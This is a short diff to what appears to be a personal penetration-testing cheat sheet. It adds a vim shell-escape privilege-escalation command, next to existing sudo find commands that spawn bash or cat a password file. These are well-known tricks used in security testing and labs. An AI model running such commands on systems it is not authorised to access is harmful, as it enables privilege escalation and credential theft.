@@ -47,6 +47,9 @@ Poratble Database
 ##### sudo -u user find /etc -name passwd -type f -exec bash \;
 ##### sudo -u user find /usr/bin -name password.txt -type f -exec cat {} \;
 
+### Privilege Escalation abusing vim
+##### sudo -u user vim -c ':!/bin/sh'
+
 ### Create wordlist for testing opensource projects
 #### find | sed 's/\.//g' > ffufwordlist.txt
 
